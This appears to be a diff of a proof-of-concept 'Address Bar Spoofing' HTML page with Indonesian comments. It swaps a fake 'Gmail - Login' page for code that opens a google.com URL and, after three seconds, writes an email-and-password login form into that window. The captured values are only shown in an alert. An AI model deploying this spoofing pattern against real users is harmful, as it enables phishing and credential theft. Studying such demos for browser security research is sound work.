@@ -6,30 +6,26 @@
     <title>Address Bar Spoofing</title>
 </head>
 <body>
-    <button onclick="spoof()">Go</button>
+    <button onclick="go()">Go</button>
 
     <script>
-        function spoof() {
-            // Base64 encoded HTML content (contoh HTML untuk di-decode)
-            var gmailBase64 = 'PGh0bWw+PGh1bj5HcmVldGluZyB0aGVtZSBwYWdlPC9odG1sPg=='; // Contoh base64 encode untuk <html><h1>Greeting theme page</h1></html>
-            
-            // Men-decoding base64 dan memasukkan hasilnya ke dalam halaman
-            var decodedContent = atob(gmailBase64);
+        function go(){
+            // Mengganti /csi menjadi /spoof di URL
+            var x = window.open('https://www.google.com/spoof'); // URL yang sudah diganti
 
-            // Memasukkan konten yang didecode ke dalam halaman
-            document.body.innerHTML = decodedContent;
-
-            // Mengubah judul halaman agar lebih menyerupai Gmail
-            document.title = "Gmail - Login";
-
-            // Memberikan waktu untuk menampilkan konten sebelum pengalihan
+            // Setelah 3 detik, mengganti konten di halaman baru dengan gambar dan form login
             setTimeout(function() {
-                window.location.assign("https://google.com:8080");  // Mengarahkan ke Gmail
-            }, 3000); // Delay 3 detik untuk memastikan tampilan muncul
+                x.document.body.innerHTML = `
+                    <h1>Please login</h1>
+                    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/wcAAwAB/74syFgAAAABJRU5ErkJggg==" 
+                    alt="Simple Image" style="width:100px;height:100px;">
+                    <br><br>
+                    Email: <input id="email"><br><br>
+                    Pass: <input id="pass" type="password"><br><br>
+                    <button onclick="alert('Email: ' + document.getElementById('email').value + '\\nPass: ' + document.getElementById('pass').value)">Login</button>
+                `;
+            }, 3000); // Menunggu 3 detik sebelum mengganti konten
         }
-
-        // Menjalankan spoof setiap 100 detik (100000 ms)
-        setInterval(spoof, 100000);
     </script>
 </body>
 </html>
